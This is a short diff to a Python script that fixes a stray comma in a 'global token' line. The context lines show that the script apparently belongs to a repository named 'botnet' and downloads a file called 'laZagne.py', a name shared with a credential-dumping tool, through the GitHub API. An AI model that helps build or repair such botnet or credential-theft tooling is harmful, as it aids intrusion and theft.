@@ -7,7 +7,7 @@ urlb = "https://api.github.com/repos/Pol-Ruiz/botnet/edit/main/laZagne.py"
 print(token)
 
 def downloadFile(urlb):
-    global token,
+    global token
     print('[!] Descargando ' + urlb)
     sha = None
     content = None
